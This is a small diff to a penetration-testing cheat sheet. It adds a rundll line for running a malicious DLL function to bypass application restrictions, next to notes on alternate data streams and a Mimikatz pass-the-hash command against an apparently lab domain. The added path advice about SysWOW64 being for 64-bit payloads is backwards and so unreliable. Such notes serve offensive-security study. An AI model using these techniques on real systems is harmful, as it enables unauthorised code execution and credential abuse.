@@ -285,6 +285,7 @@ Includes web services (not just port 80)
 - You can also use native bins such as `rundll` to get code exec: `rundll32 myevil.dll,pwnFunction`
 - Use an alternate data stream: `C:\path\to\writable\file.log:evil.js`
 - Check if there's a 3rd party scripting engine such as python or if JRE for java is on there
+- See if they have DLL restrictions. Get codexec with `rundll`: `C:\windows\system32\rundll.exe EvilDll.dll,maliciousFunc` (use `C:\Windows\SysWOW64\rundll.exe` for 64 bit payloads)
 
 ## Mimikatz
 You can wrap these in for ex. `PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:lemons /domain:dollarcorp.moneycorp.local /ntlm:NThashHERE /run:powershell.exe`
